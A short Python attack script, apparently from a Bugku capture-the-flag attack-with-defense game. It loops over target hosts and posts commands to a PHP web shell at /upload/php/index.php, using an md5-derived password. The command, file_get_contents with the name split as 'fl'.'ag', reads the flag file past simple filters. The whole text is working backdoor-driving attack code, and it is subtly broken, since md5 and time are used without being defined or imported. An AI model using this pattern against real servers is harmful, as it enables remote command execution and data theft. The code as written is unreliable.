import requests
ip_list = [197]
for i in ip_list:
    url="http://192-168-1-{}.awd.bugku.cn".format(i)        
    port='80'
    path='/upload/php/index.php'
    passis=md5("testawd"+str(i))
    url1=url+path
    data = {
        'pass':passis,
        'cmd':'echo file_get_contents("fl"."ag");'
    }
    response=requests.post(url=url1,data=data,timeout=10)
    response.encoding=response.apparent_encoding
    print(response.text)
    time.sleep(60)

